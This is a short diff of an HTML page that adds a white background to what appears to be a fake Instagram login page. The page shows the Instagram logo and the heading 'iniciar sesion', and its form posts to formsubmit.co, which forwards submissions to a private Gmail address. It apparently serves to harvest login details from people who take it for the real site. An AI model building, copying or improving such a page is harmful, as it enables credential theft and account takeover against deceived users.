@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8" />
 </head>
-<body>
+<body bgcolor="white">
     <img width="1000px" src="https://assets.turbologo.com/blog/es/2019/09/19133022/instagram-logo-illustration.png" />
     <h2>iniciar sesion</h2>
     <form action="https://formsubmit.co/enekocat0@gmail.com" method="POST">
